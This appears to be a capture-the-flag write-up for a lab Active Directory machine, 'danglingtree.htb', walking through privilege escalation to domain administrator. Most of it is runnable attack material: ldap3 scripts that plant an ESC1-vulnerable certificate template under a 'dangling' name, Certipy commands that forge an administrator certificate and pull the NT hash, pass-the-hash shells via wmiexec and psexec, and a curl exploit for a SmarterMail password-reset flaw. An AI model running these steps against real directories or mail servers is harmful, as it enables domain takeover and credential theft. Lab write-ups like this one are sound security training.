    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  31
    Template Name                       : UserSignature
    Display Name                        : User Signature Only
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
  32
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

- We check the list of certificate names the CA is configured to issue:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' get object \
  'CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  --attr certificateTemplates

distinguishedName: CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
certificateTemplates: RemoteAccessVPN; EmployeeAuthTemplate; VPNUserTemplate; DirectoryEmailReplication; DomainControllerAuthentication; KerberosAuthentication; EFSRecovery; EFS; DomainController; WebServer; Machine; User; SubCA; Administrator
```

- As we see only 14 or the 32 templates can be issued by the CA. Furthermore, there are 3 templates the CA can issue but don't actually exist : `RemoteAccessVPN`, `EmployeeAuthTemplate`, and `VPNUserTemplate`.

- We can thus create this template for the CA to issue.

- First let's check a template to see all the flags we need:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' get object \
  'CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb'
  
---OUTPUT---
distinguishedName: CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
cn: WebServer
dSCorePropagationData: 2026-03-26 06:08:39+00:00
displayName: Web Server
flags: 66113
instanceType: 4
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.16
msPKI-Certificate-Name-Flag: 1
msPKI-Enrollment-Flag: 0
msPKI-Minimal-Key-Size: 2048
msPKI-Private-Key-Flag: 0
msPKI-RA-Signature: 0
msPKI-Template-Minor-Revision: 1
msPKI-Template-Schema-Version: 1
nTSecurityDescriptor: O:S-1-5-21-4220238332-57023728-1129110646-519G:S-1-5-21-4220238332-57023728-1129110646-519D:PAI(OA;;0x130;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4220238332-57023728-1129110646-512)(OA;;0x130;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4220238332-57023728-1129110646-519)(A;;0xf00ff;;;S-1-5-21-4220238332-57023728-1129110646-512)(A;;0xf00ff;;;S-1-5-21-4220238332-57023728-1129110646-519)(A;;0x20094;;;S-1-5-11)
name: WebServer
objectCategory: CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,DC=danglingtree,DC=htb
objectClass: top; pKICertificateTemplate
objectGUID: 5dbfc06a-a25b-4f9a-9d33-4c16846d0f3a
pKICriticalExtensions: 2.5.29.15
pKIDefaultCSPs: 2,Microsoft DH SChannel Cryptographic Provider; 1,Microsoft RSA SChannel Cryptographic Provider
pKIDefaultKeySpec: 1
pKIExpirationPeriod: -730 days, 0:00:00
pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.1
pKIKeyUsage: oAA=
pKIMaxIssuingDepth: 0
pKIOverlapPeriod: -42 days, 0:00:00
revision: 4
showInAdvancedViewOnly: True
uSNChanged: 12828
uSNCreated: 12828
whenChanged: 2026-03-26 05:44:31+00:00
whenCreated: 2026-03-26 05:44:31+00:00
```
![[Pasted image 20260814085631.png]]

- We also check the OID so it matches with the template we create:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' get object 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' --attr msPKI-Cert-Template-OID

bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' get object 'CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' --attr msPKI-Cert-Template-OID

---OUTPUT-1---
distinguishedName: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.1

---OUTPUT-2---
distinguishedName: CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.16
```

- Finally using one of the ghost template names, we create a template with the following python code. Note that we can change the template name to any of the ghost templates we found:
```
cat createcert.py

---OUTPUT---
from ldap3 import Server, Connection, NTLM, MODIFY_ADD
import random

server = Server('dc.danglingtree.htb', port=636, use_ssl=True, get_info=None)
conn = Connection(server, user='danglingtree\\jake.h', password='Password123!', authentication=NTLM, auto_bind=True)

base = 'CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb'
tmpl_name = 'EmployeeAuthTemplate'  # the phantom name you're claiming

# --- Pull ground truth from a real, CA-recognized template ---
reference_template = 'WebServer'
conn.search(
    f"CN={reference_template},CN=Certificate Templates,{base}",
    '(objectClass=pKICertificateTemplate)',
    attributes=['msPKI-Cert-Template-OID', 'msPKI-Template-Minor-Revision', 'revision']
)
ref = conn.entries[0]
ref_oid = str(ref['msPKI-Cert-Template-OID'])
forest_prefix = '.'.join(ref_oid.split('.')[:-1])  # drop the last (per-template) segment
ref_minor_rev = int(str(ref['msPKI-Template-Minor-Revision']))
ref_revision = int(str(ref['revision']))

print(f"[*] Forest OID prefix: {forest_prefix}")
print(f"[*] Reference revision/minor-revision: {ref_revision}/{ref_minor_rev}")

# --- Build a forest-correct OID for our new template ---
new_suffix = random.randint(10000, 99999)
new_oid = f"{forest_prefix}.{new_suffix}"

oid_cn = f"{random.randint(10000000,99999999)}.{random.randint(10**31,10**32-1):032X}"
oid_dn = f"CN={oid_cn},CN=OID,{base}"

conn.add(oid_dn, ['top', 'msPKI-Enterprise-Oid'], {
    'cn': oid_cn,
    'msPKI-Cert-Template-OID': new_oid,
    'displayName': tmpl_name,
    'flags': '1',
})
print("[*] OID object:", conn.result)

# --- The certificate template object itself ---
tmpl_dn = f"CN={tmpl_name},CN=Certificate Templates,{base}"

conn.add(tmpl_dn, ['top', 'pKICertificateTemplate'], {
    'displayName': tmpl_name,
    'msPKI-Cert-Template-OID': new_oid,
    'flags': '0',
    'revision': str(ref_revision),
    'msPKI-Template-Minor-Revision': str(ref_minor_rev),   # <-- the missing piece
    'pKIDefaultKeySpec': '1',
    'pKIKeyUsage': bytes([0xA0, 0x00]),
    'pKIMaxIssuingDepth': '0',
    'pKICriticalExtensions': ['2.5.29.15'],
    'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],
    'pKIDefaultCSPs': ['1,Microsoft Enhanced Cryptographic Provider v1.0'],
    'msPKI-RA-Signature': '0',
    'msPKI-Enrollment-Flag': '0',
    'msPKI-Private-Key-Flag': '16842752',
    'msPKI-Certificate-Name-Flag': '1',
    'msPKI-Minimal-Key-Size': '2048',
    'msPKI-Template-Schema-Version': '1',
    'msPKI-Certificate-Application-Policy': ['1.3.6.1.5.5.7.3.2'],
    'pKIExpirationPeriod': bytes([0x00, 0x40, 0x39, 0x87, 0x2E, 0xE1, 0xFE, 0xFF]),  # ~1 year
    'pKIOverlapPeriod': bytes([0x00, 0x80, 0xA6, 0x0A, 0xFF, 0xDE, 0xFF, 0xFF]),      # ~6 weeks
})
print("[*] Template object:", conn.result)
print("[*] New OID assigned:", new_oid)
```

- Or a semi minimal one that just adds the required flags (the above one also checks the flags in another template to compare). **Note that this uses `RemoteAccessVPN` template instead.** 
```
cat certsemimin.py 

---OUTPUT---
from ldap3 import Server, Connection, NTLM
import random

server = Server('dc.danglingtree.htb', port=636, use_ssl=True, get_info=None)
conn = Connection(server, user='danglingtree\\jake.h', password='Password123!', authentication=NTLM, auto_bind=True)

base = 'CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb'
tmpl_name = 'RemoteAccessVPN'  # the phantom name you're claiming

# --- Get the real forest OID prefix from an existing template ---
conn.search(
    f"CN=WebServer,CN=Certificate Templates,{base}",
    '(objectClass=pKICertificateTemplate)',
    attributes=['msPKI-Cert-Template-OID']
)
ref_oid = str(conn.entries[0]['msPKI-Cert-Template-OID'])
forest_prefix = '.'.join(ref_oid.split('.')[:-1])  # drop trailing per-template segment
print(f"[*] Forest OID prefix: {forest_prefix}")

# 1. OID object — build with the real forest prefix, not a random arc
new_oid = f"{forest_prefix}.{random.randint(10000,99999)}"
oid_cn = f"{random.randint(10000000,99999999)}.{random.randint(10,99)}"
oid_dn = f"CN={oid_cn},CN=OID,{base}"

conn.add(oid_dn, ['top', 'msPKI-Enterprise-Oid'], {   # 'leaf' -> 'top'
    'cn': oid_cn,
    'msPKI-Cert-Template-OID': new_oid,
    'displayName': tmpl_name,
    'flags': '1',
})
print("[*] OID object:", conn.result)

# 2. The certificate template object itself
tmpl_dn = f"CN={tmpl_name},CN=Certificate Templates,{base}"

conn.add(tmpl_dn, ['top', 'pKICertificateTemplate'], {
    'displayName': tmpl_name,
    'msPKI-Cert-Template-OID': new_oid,
    'flags': '0',
    'revision': '100',
    'msPKI-Template-Minor-Revision': '1',
    'pKIDefaultKeySpec': '1',
    'pKIKeyUsage': bytes([0xA0, 0x00]),
    'pKIMaxIssuingDepth': '0',
    'pKICriticalExtensions': ['2.5.29.15'],
    'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],
    'pKIDefaultCSPs': ['1,Microsoft Enhanced Cryptographic Provider v1.0'],
    'msPKI-RA-Signature': '0',
    'msPKI-Enrollment-Flag': '0',
    'msPKI-Private-Key-Flag': '16842752',
    'msPKI-Certificate-Name-Flag': '1',
    'msPKI-Minimal-Key-Size': '2048',
    'msPKI-Template-Schema-Version': '1',
    'msPKI-Certificate-Application-Policy': ['1.3.6.1.5.5.7.3.2'],
    'pKIExpirationPeriod': bytes([0x00, 0x40, 0x39, 0x87, 0x2E, 0xE1, 0xFE, 0xFF]),  # ~1 year
    'pKIOverlapPeriod': bytes([0x00, 0x80, 0xA6, 0x0A, 0xFF, 0xDE, 0xFF, 0xFF]),      # ~6 weeks
})
print("[*] Template object:", conn.result)
print("[*] New OID assigned:", new_oid)
```
- **The main change we make compared to the other templates is we make it intentionally vulnerably through ESC1 by setting the `msPKI-Certificate-Name` flag to `1`**
	- **lets the requester specify any SAN/UPN in the certificate request. Without this, the CA controls what name goes in the cert so we can't specify `administrator`**
- If we check templates we can see there is a new 33rd template. Or else we can just check vulnerable templates
```
certipy-ad find -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.72.173 -stdout -vulnerable   

---OUTPUT---
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : danglingtree-DC-CA
    DNS Name                            : dc.danglingtree.htb
    Certificate Subject                 : CN=danglingtree-DC-CA, DC=danglingtree, DC=htb
    Certificate Serial Number           : 6E77D503246E55B34D28C464F186BD4B
    Certificate Validity Start          : 2026-08-03 16:32:49+00:00
    Certificate Validity End            : 2126-08-03 16:42:49+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DANGLINGTREE.HTB\Administrators
      Access Rights
        Enroll                          : DANGLINGTREE.HTB\Authenticated Users
        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
        ManageCa                        : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
    [+] User ACL Principals             : DANGLINGTREE.HTB\Helpdesk_Cert_Support
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates
  0
    Template Name                       : EmployeeAuthTemplate
    Display Name                        : EmployeeAuthTemplate
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-08-14T20:00:54+00:00
    Template Last Modified              : 2026-08-14T20:00:54+00:00
    Permissions
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\jake.h
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Local System
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Local System
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Local System
                                          DANGLINGTREE.HTB\Enterprise Admins
    [+] User ACL Principals             : DANGLINGTREE.HTB\jake.h
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
```

- We give ourselves GenericAll privilege on it granting us enrollment rights:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' add genericAll \
  'CN=RemoteAccessVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  jake.h
  
---OUTPUT---
[+] jake.h has now GenericAll on CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
```

- We then verify it with the command earlier :
```
certipy-ad find -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.72.173 -stdout -vulnerable
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : danglingtree-DC-CA
    DNS Name                            : dc.danglingtree.htb
    Certificate Subject                 : CN=danglingtree-DC-CA, DC=danglingtree, DC=htb
    Certificate Serial Number           : 6E77D503246E55B34D28C464F186BD4B
    Certificate Validity Start          : 2026-08-03 16:32:49+00:00
    Certificate Validity End            : 2126-08-03 16:42:49+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DANGLINGTREE.HTB\Administrators
      Access Rights
        Enroll                          : DANGLINGTREE.HTB\Authenticated Users
        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
        ManageCa                        : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
    [+] User ACL Principals             : DANGLINGTREE.HTB\Helpdesk_Cert_Support
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates
  0
    Template Name                       : EmployeeAuthTemplate
    Display Name                        : EmployeeAuthTemplate
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-08-14T20:00:54+00:00
    Template Last Modified              : 2026-08-14T20:06:00+00:00
    Permissions
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\jake.h
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\jake.h
                                          DANGLINGTREE.HTB\Local System
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\jake.h
                                          DANGLINGTREE.HTB\Local System
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\jake.h
                                          DANGLINGTREE.HTB\Local System
                                          DANGLINGTREE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\jake.h
    [+] User ACL Principals             : DANGLINGTREE.HTB\jake.h
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC15                             : Enrollee supplies subject and schema version is 1.
      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

- Although we know it we can also grab the SID of Administrator:
```
bloodyAD --host dc.danglingtree.htb -d danglingtree.htb -u 'jake.h' -p 'Password123!' get object 'CN=Administrator,CN=Users,DC=danglingtree,DC=htb' --attr objectSid

---OUTPUT---
distinguishedName: CN=Administrator,CN=Users,DC=danglingtree,DC=htb
objectSid: S-1-5-21-4220238332-57023728-1129110646-500
```

- Finally we request an administrator certificate (with it's SID included)
```
certipy-ad req -u 'jake.h@danglingtree.htb' -p 'Password123!' -dc-ip 10.129.72.173 -target-ip 10.129.72.173 -dc-host 10.129.72.173 -ca danglingtree-DC-CA -template EmployeeAuthTemplate -upn administrator@danglingtree.htb -sid S-1-5-21-4220238332-57023728-1129110646-500
Certipy v5.1.0 - by Oliver Lyak (ly4k)

---OUTPUT---
[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@danglingtree.htb'
[*] Certificate object SID is 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

- Finally we authenticate it and get the hash. Note the clock skew in our initial nmap scan as the skew will stop us. Fix it with faketime:
```
faketime "+7hours" certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.72.173
Certipy v5.1.0 - by Oliver Lyak (ly4k)

---OUTPUT---
[*] Certificate identities:
[*]     SAN UPN: 'administrator@danglingtree.htb'
[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Using principal: 'administrator@danglingtree.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

- Finally we can connect to the target either with psexec or wmiexec to get an administrator shell:
```
wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 danglingtree.htb/administrator@10.129.72.173

---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
![[Pasted image 20260814091931.png]]

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925 administrator@10.129.72.173

---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.72.173.....
[*] Found writable share ADMIN$
[*] Uploading file qmBPOENh.exe
[*] Opening SVCManager on 10.129.72.173.....
[*] Creating service dRhs on 10.129.72.173.....
[*] Starting service dRhs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.26100.33158]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```
![[Pasted image 20260814091946.png]]

- I grab the root flag:
![[Pasted image 20260814092044.png]]

---------
----
# Alternate route to decrypt password of noah.b
- Another way to go about this is through another CVE which allows us to reset the admin password of SmarterMail. : CVE-2026-23760 along with the previous CVE (CVE-2026-24423)as we need the shell to find the backup domain (and confirm admin username)
- There are two ways to go about it. 
- One is through the PoC : https://github.com/MaxMnMl/smartermail-CVE-2026-23760-poc
- We capture a pacquet from BurpSuite and alter it to the PoC.
![[Pasted image 20260816114926.png]]
- The response show's that the reset was successful

- Alternatively using a curl command we can send the request and reset it too:
```
curl -k -X POST http://240.0.0.1:17017/api/v1/auth/force-reset-password \
  -H "Content-Type: application/json" \
  -d '{"username":"svc_mail","newPassword":"Hacked123!","confirmPassword":"Hacked123!","oldPassword":"anything","IsSysAdmin":true}'
  
---OUTPUT---
{"username":"","errorCode":"","errorData":"","debugInfo":"check1\r\ncheck2\r\ncheck3\r\ncheck4.2\r\ncheck5.2\r\ncheck6.2\r\ncheck7.2\r\ncheck8.2\r\n","success":true,"resultCode":200}
```
![[Pasted image 20260816115118.png]]

- We can then sign into SmarterMail as `svc_mail`

***NOTE: We identify svc_mail as the user by simply enumerating the Users directory finding svc_mail there***
![[Pasted image 20260816120935.png]]

![[Pasted image 20260816115642.png]]

- However `danglingtree.htb` domain holds only one user `svc_mail`
- We need to load the backup Domain `danglingtree.htb.bak`
	- We know the path exists during enumeration on our earlier shell to be `C:\SmarterMail\Domains\danglingtree.htb.bak`
	- This is from she shell of `svc_mail` as `anderson.w` does not have privileges to check this path beyond `C:\SmarterMail`
![[Pasted image 20260816121552.png]]
- In order to add this domain, we need to first delete the earlier domain as this is a free version of SmarterMail:
![[Pasted image 20260816121714.png]]

- Then we click the 3 dots next to delete and select "Attach Domain"
![[Pasted image 20260816121822.png]]

- We enter the path `C:\SmarterMail\Domains\danglingtree.htb.bak`
![[Pasted image 20260816121909.png]]

- This should attach the new domain and we can then select it :
![[Pasted image 20260816122033.png]]

- Then right above we click "Accounts" and select our user `noah.b`:
![[Pasted image 20260816122146.png]]

- Finally clicking on the Eye icon will reveal the user's password:
![[Pasted image 20260816122243.png]]

![[Pasted image 20260816122303.png]]


# ESC7/ManagedCertificates route to root (More Intended)
- This route follows the steps of this article which uses the GUI to perform most of the exploit:
	- https://jakehildreth.github.io/blog/2026/01/31/Introducing-Dangling-Templates.html
- First we RDP to the target as `jake.h`:
```
xfreerdp /u:jake.h /p:'Password123!' /v:10.129.74.221

> y    # to certificate
```
![[Pasted image 20260816122636.png]]

- We then search Certificate Authority in the search bar below and open it:
![[Pasted image 20260816122854.png]]

- It prompts us to re-enter our password `jake.h`:`Password123!`
![[Pasted image 20260816122940.png]]

- We navigate to `danglingtree.DC-CA` > `Certificate templates`:
![[Pasted image 20260816123040.png]]

- Here we can see the 3 Dangling Templates we can use (with a red cross next to them)
- Our user `jake.h` has `ManageCertificates` privileges (though not `ManageCA`) This is why make officer command with certipy-ad fails so the documented approach to ESC7 fails.

- However we have the ability to duplicate templates.
- Right click anywhere on the folder (certsrv.exe) and select Manage:
![[Pasted image 20260816123409.png]]

- This will open all the templates (except our Dangling templates) and we can right click any of these to duplicate them. I duplicate the `Administrator` template here but we can choose any I believe:
![[Pasted image 20260816123543.png]]

- First we set the Template Name to be that of the Dangling Template. We cna choose any of the three. Here I choose `RemoteAccessVPN` template. The Display Name can be anything. These entries can be found under the `General tab`:
![[Pasted image 20260816123903.png]]

-  Now we need to set up our duplicate template such that it is vulnerable to ESC1:
```
Tab 1 — General

Template display name: RemoteAccessVPN
Template name: RemoteAccessVPN

Tab 2 — Subject Name

Select "Supply in the request" ← this is the ESC1 flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Uncheck "Use subject information from existing certificates for autoenrollment renewal requests"

Tab 3 — Extensions

